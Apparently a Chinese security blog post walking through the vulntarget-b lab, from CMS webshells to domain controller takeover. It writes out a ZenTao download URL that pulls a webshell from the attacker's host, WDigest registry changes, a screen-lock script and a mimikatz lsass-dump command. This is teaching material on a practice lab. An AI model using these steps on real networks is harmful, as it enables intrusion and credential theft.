@@ -1,0 +1,302 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MNLPm1QpTq5PkXdppVGWug)
+
+公众号
+
+✎ 阅读须知
+
+  
+
+乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。
+
+乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经授权，不得用于其他。
+
+本文所提供的工具仅用于学习，禁止用于其他，请在 24 小时内删除工具文件！！！
+
+本文作者 NaMi
+
+01
+
+**vulntarget-b 拓扑**
+
+  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YIeX759vJbicJJ0Z1sQnK8CdOqYt493v2t0E3hSxrxM2LKEpy7KfdBIQ/640?wx_fmt=png)
+
+IP1：`192.168.10.104`
+
+IP2：`10.0.20.30`
+
+搭建好环境之后，开始我们的实验。
+
+vulntarget-2 下载地址  
+
+百度云:
+
+链接: https://pan.baidu.com/s/1Hdqkojmu-CeIuPr2gLWHwA
+
+提取码: s4ka
+
+阿里云暂不支持 zip 文件分享。。。。。  
+
+原文地址：[vulntarget 漏洞靶场系列（二）— vulntarget-b](http://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647778908&idx=1&sn=5fe531b3f6586ab6f35b3e4bf25d832e&chksm=f35fbda0c42834b6b3e2a1184acf51a923e4c0cefb3c58a3abf8f2680c4638105728c358e96e&scene=21#wechat_redirect)
+
+关于 vulntarget 漏洞靶场：  
+
+https://github.com/crow821/vulntarget
+
+![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)
+
+02
+
+**打 靶 流 程**
+
+  
+
+**3.1  WEB 渗透 - Centos7**
+-------------------------
+
+对 WEB 服务器进行端口扫描，看到开放的一些端口情况。其中 888 是 phpmyadmin，8888 是 bt。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Y25h4GAcMuGKOBrFKic5paK9pfnN5MJdBAicf7ekZ264v6zg9Z7ic65MIg/640?wx_fmt=png)
+
+查看一下详情：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YX8VM98xicibKQq3ibWXJiaNhpUvxUibiaWkkD97fibJcHZ7KJJAZTlt1YMicgg/640?wx_fmt=png)
+
+来到`81`端口，是一个极致`cms`建站系统，从弱口令登录。一开始尝试了很多`前台SQL`注入漏洞，都不存在：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Y8YNRkZWvsCsI7MRkicYicic6UB11oeq77Ho6PNgiaetJwcZoWkiaHbvDPibw/640?wx_fmt=png)
+
+后台的扩展管理的位置存在任意文件压缩下载，需要启动一个服务，然后再`download_url=`的位置传入，就会下载文件：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Y0eHCEmJwR3oHRxepXTiaiasbxBF2BleqHDUjubicGLQKjacn1GPCDZEwg/640?wx_fmt=png)
+
+使用冰蝎工具进行连接：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YbrN0icSNOSSzibosXMtxfqGsUibqAdN7yqmZjswMKvniclAHFHWawSaAVg/640?wx_fmt=png)
+
+当执行命令的时候，发现函数被禁用了，在 phpinfo 的位置查看`disable_function`能看到什么函数被禁用：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YmibvdY4ZQNHcyjQJSL9oc7RYAAiceVSric6ssiaA6Kicdjl1llbWO9MaqFw/640?wx_fmt=png)
+
+然后使用蚁剑的插件进行绕过，成功执行命令：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YPpLEvf1r9QQTibtviciaRBw4Y2QdHHOUjgicMdnHKSx87xibZ8JyZr7Erwg/640?wx_fmt=png)
+
+生成一个反向的后门文件，反弹`shell`到`meterpreter`：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YDO2YjlaB8pFOLcamUviaPCTprzEQacHIibbD8TwfmUrJKZkOJKGzHwoA/640?wx_fmt=png)
+
+使用`suggester`脚本，进行提权的搜索。存在三个提权的方法：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YpZJabNg3zPyTe0jWFgCooRdr1XU23vQWJz34LUTHibHUBmROnZuPnrQ/640?wx_fmt=png)
+
+使用`sudo_baron_samedit`提权至`root`权限：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YxgRTGAbibib3icIGLibKXibGjCLvbA9KT1p9MFfpoPwdpJaxwy9iahFv6e7w/640?wx_fmt=png)
+
+**3.2 横向移动 - 禅道 CMS**
+---------------------
+
+查看网卡信息，存在第二块网卡：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YTNYpCCWZ1Fl3L7sDm0S1Nxu4ibTEqVibmPmcqQvVic7QFUycon5XhxmLg/640?wx_fmt=png)
+
+在根目录发现了`flag`
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YkibE9U6Vk5OtVJqMOfBhw51omO8dpJ0yUcWRpUM60gdJadTTVe4H6og/640?wx_fmt=png)
+
+接着进行内网渗透，先添加路由表，让我们能跨路由进行攻击：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YkAlhI7aFrKXvVn7ZEibOls3lF2WSDXkIwXSj8ibqjDdovpAQAaz5mQdw/640?wx_fmt=png)
+
+使用`fscan`进行端口扫描，但是常规的方式没有发现其他的`IP`
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YCOYdhfNliabT4TshR8tZ1EIp4Tv5TdLHgicQibXRJ5ia0uDo75tOrojQjA/640?wx_fmt=png)
+
+使用`portscan`模块指定一部分常用端口，进行扫描。发现了`20.66`
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YdUxL134xiakzfbvgQsz19fCZEia9FI3q2LnnL2Yb4qciaUISbzQDicGG4g/640?wx_fmt=png)
+
+同样使用`nmap`的端口扫描，发现开放了`3306`和`8080`端口
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YmV9VELaBdMNSs2Qb0NQodwuY2qRSIyUWLTBTktEsUzTvC5icLVfdnvQ/640?wx_fmt=png)
+
+打开`8080`是一个`禅道cms`。这里也是用了注入漏洞，文件读取都未成功：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YBm696QiatTzpRz1e78xWqnhoxiaMy9yfUrCwqhSnXdnxYfLric5IukKhw/640?wx_fmt=png)
+
+然后查看文档，使用弱口令登录后台：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YIibJrDkTDcSAibBRBxB1OQSlfmToGO7deWT0mm6O2aqYGicjQkTkMWeGg/640?wx_fmt=png)
+
+使用后台的任意文件下载漏洞获取`shell`，首先启动一个 web 服务：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YDlUic3VsaVg2ic77xich028xpahOxwUAXR4hic5hLZdBVtFEt4W5Y70Cfg/640?wx_fmt=png)
+
+```
+/index.php?m=client&f=download&version=1&link=ZnRwOi8vMTkyLjE2OC41Mi4xL3NoZWxsLnBocA==
+```
+
+link 位置是 base64 编码的地址
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YSqUbJJGkPQOsmnfFZAy3kJ27Rib8No1nsccLWTGqm2uHWc1aDMPAYRw/640?wx_fmt=png)
+
+然后正常访问到下载的木马文件
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YkRo1KtOWt7TTiaibOUUJL7wgT6PNVxAVpA0gqd13xDicXDRibdXjztc6GA/640?wx_fmt=png)
+
+获取到之后直接就是 root 权限。在这里尝试了多次正向失败，关闭本地防火墙然后进行反弹 shell：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YTV4OfXKyY1cKfqTcXjf6cEowgdfvFOfKcMf732qE1xNre1NdDEWycg/640?wx_fmt=png)
+
+使用监听：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YbHxzFulvRlRPsOoIXG37sKyqzQwC0GMrlPxHLe2SPH7n6uMpD2J4lA/640?wx_fmt=png)
+
+反弹成功：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Yuf0mMZfGZRmo3ViaNpTY2suw0DkhF8gD1Q9ogsSzCibWmeARa17Mp8rw/640?wx_fmt=png)
+
+查看进程，当前机器使用了火绒：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Y2DYYRVPibFfxHPnN4OuGMC5sF7orJEWsNxPibNsyV44KiahS6KU1CicayA/640?wx_fmt=png)
+
+寻找提权的方式，使用`systeminfo`命令，将结果复制到网站：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YiayANJAEvKjlCib5wxR6KYNVtTeSt5ZT2K6b8KaBWduVQJAFrzic5mJ8Q/640?wx_fmt=png)
+
+最终使用了`CVE_2021_1732_win32k`这个提权工具，多执行几次就能成功，我也是看作者这样做的：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Ybrwc8PTssdtHxrFkwicUQUGicNsGhmBCrhss5ciaj8pJbtwDYtDhLBB3w/640?wx_fmt=png)
+
+查看网卡的配置，当前是存在域环境的，然后也存在第二块网卡，添加路由：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YA5zka25tMtnM1ibxbQ8taD6cK5svaYsBzrymEe0Gx1kS8zXeK5UUicRQ/640?wx_fmt=png)
+
+使用命令查找域控制器的 IP，由于存在火绒，需要谨慎操作，不然 session 会断掉：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Ymbiaxam3EbzceyxZjrDN1O1024J1lNEtU4YcU6R4Cj8wDOC9ribB4dqg/640?wx_fmt=png)
+
+当前进程中，也是存在域用户的，存在域用户就可以使用域提权漏洞获取域控制器的权限：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YvMT3S7yyovibOKguGoVaolf1OlQGyJBqntSn8NabNME6CkZtVZ1ep5Q/640?wx_fmt=png)
+
+使用`mimikatz`的`creds_all`命令抓取密码 ，但是没有明文密码。使用这个命令并未拦截：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YozE1MD235KPj6LMfAr0XZzRbXW6Yfd2lpGrHnLTlDDGhTPpibU87kwA/640?wx_fmt=png)
+
+由于是 win10 系统，微软在 windows 2012 之后就打了补丁 kb2871997，需要修改注册表抓取密码。第一条是开启，第二条是关闭：
+
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLMS\YSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
+```
+
+修改注册表之后，需要重启或者管理员重新登录才能抓取明文密码，这里可以使用脚本让其锁屏
+
+lock.ps1
+
+```
+Function Lock-WorkStation {
+$signature = @"
+[DllImport("user32.dll", SetLastError = true)]
+public static extern bool LockWorkStation();
+"@
+$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
+$LockWorkStation::LockWorkStation() | Out-Null
+}
+Lock-WorkStation
+```
+
+这样就抓取到了明文密码：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YmHh7icxib2VFqHnwLZg7ibo9Str8UF79z0CJ29wWuWtzF2fgCsh4113ew/640?wx_fmt=png)
+
+对域控 IP 进行端口扫描，开放的`88，445，135`端口：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YdiamWJHOFNHlV0ycY415BYqGN68UicEDkxfiaCib0ZgLhuMMPiaURBpJqRA/640?wx_fmt=png)
+
+**3.3 域提权 CVE-2021-42287/CVE-2021-42278**
+-----------------------------------------
+
+使用 py 脚本，填写 "域 / 域用户: 域密码"，成功获取到域控机器的权限：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YBn0Xic7JcRvsY2B6nXY5rf7VACsROs5xR3oW8iaLup9BHBrY1zicia7RGw/640?wx_fmt=png)
+
+使用脚本开启`3389`，使用 rdp 协议进行连接：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Yu9OlqpY7YuVrdV557QYWzVcKf2fdnVZ8yNvCl0zEh7V84xrOvWppxg/640?wx_fmt=png)
+
+关闭防火墙：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Y9ibWuG7icpDFwppyTEfSzyJPeEltaHUia49JrLPNLTEVib7rnC9CmFXmLw/640?wx_fmt=png)
+
+但是在这里连接失败
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Y9hBjICicMX582ww6qibFkDT7ayEBiaDl3DkYR7fCysypJ0NPAx6giavlyQ/640?wx_fmt=png)
+
+原因是由于域控机器开启了如下的功能，需要使用相同的机器才能进行远程访问：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6Yy1CJc9jKktDAFoicPUic05NaMS4g18U2gIUCiaw6RlmXwbhlLTqQFGRjw/640?wx_fmt=png)
+
+上面的`exp`脚本也可以直接`-dump`导出当前的`hash`，我忘记截图了。然后使用将`hash`进行`md5`解密，得知密码：`Admin_@_123`
+
+既然知道了密码，在`win10`机器上进行`IPC`连接，上传正向的后门到域控制器：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YvlqykVAN2lFh7BSnVfYFSvyibJ4CEaPxibwAY221iaYaiaFbtTAYkyAa8w/640?wx_fmt=png)
+
+成功获取到域控制器的机器
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YcRXBTsOOCSccPtMpn8QHj848icfoQJmcFLavgnFgtB7cnYnGXZgPneQ/640?wx_fmt=png)
+
+如下就是所有的 sessions
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YgQrHyNIsf0byAsgkEcb2bicCUZhOKibESIIJIjiaool9Sdtxic44YpbpCQ/640?wx_fmt=png)
+
+**3.4 拓展**
+----------
+
+还可以使用`procdump`的方式导出`lsass.exe`，存放在当前文件的`lsass.dmp`
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YV1Yicfc48skQ6dYxPHc3zJVcEg60oS2oDORLhqhl266ibXYJ2oPLuC3w/640?wx_fmt=png)
+
+接着使用 mimikatz 进行密码读取
+
+```
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1DMlOYnZNTcpia3Ag7Mx5z6YibkQpkJgQBkSwiboj2ib8vxBGqJRUejYENr4uOYRwHDkqZajjssuMwHSA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7PuqRWWU6zPRMxSeBfjvKhbuTlWQcqk8L2ib8dROI0fFTknJfEctspUxmbxZwkvG9214pibCEmGWsuEDvDad20tA/640?wx_fmt=png)  
+
+新书推荐
+
+![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQGCeAxCpwiafHPCQ59GvHz6giandwhxYRRbpy9Fg4r24n3DUppDIuN9AdtiaAYaIEm15OGhIfuv6Mzkg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_gif/TN05MmJLxMrNiboff6rhmPUYUNXdWTXZfiaHXPuUGqmPZtqhI6NtGicPMIu6ohOCReWY2C4YZY4AIchDMyal6KWQw/640?wx_fmt=gif)
+
+《GO 语言区块链应用开发从入门到精通》全面地介绍了 Go 语言区块链应用工程师所需要的基础知识和各种技术，主要分为基础篇、进阶篇和实战篇三部分。全书共 7 章，其中 1～2 章为基础篇，介绍 Go 语言环境安装、基础语法、函数编程、容器编程、面向对象编程、并发编程以及网络编程；3～5 章为进阶篇，第 3 章介绍区块链基本原理、发展历程、行业应用案例，第 4 章主要介绍智能合约，包括 solidity 基础语法，多个经典案例，以及 Go 语言如何调用智能合约，第 5 章主要介绍区块链原理的程序化实践，包括 Go 语言实现 Base58 编码、P2P 网络、PoW 共识、区块链组块以及 UTXO 账户模型实现；6～7 章为实战篇，介绍 2 个实战项目，第 6 章介绍如何实现 Go 语言版的区块链钱包项目，内容包括助记词生成、私钥存储、Coin 交易以及 Token 交易等内容，第 7 章介绍如何实现一个版权交易系统，内容包含如何去设计区块链应用系统、后端功能如何与区块链相结合，它既是一个区块链系统应用项目，也是一个 Go 语言 Web 服务器项目。《GO 语言区块链应用开发从入门到精通》适合想从事 GO 语言区块链开发的程序员及 GO 语言爱好者阅读。
+
+![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqONvGUibOiajRpg6I5uw8s3vopR0d5XMiaFtJxPCZnicCxrO5v4ZakBsFKw/640?wx_fmt=jpeg)
+
+  
+
+点击上方链接，更多优惠等你哦~  
+
+tips：加我 wx，拉你入群，一起学习
+
+![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJOca699BJK50FDxBNnhRZrS1hyXb2K4AkLTYfJwticmyHQxv3X6vZHfQ/640?wx_fmt=jpeg)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/CibE0jlnugbX5SLGI9312kOrkH7gXIN5NPic75bQ8WbAFMEqvZiaQ0WSk4W9eYUfJJRzlMgibjic8mIGicMvjialoDgmQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJkslQQ2B5nDuKBlpbKHHtME5RBrJsYucDbPWpyglY02yicRq93PTWn7w/640?wx_fmt=jpeg)
+
+扫取二维码获取
+
+更多精彩
+
+乌鸦安全
+
+![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Bt3mgRlo88wGCQuAJ2kv0pzM18jFmpv4CJEBMNAicGSSvDlWSN6DG5JJ0Q8EI6oEuaZS0QNyAojYw/640?wx_fmt=gif)
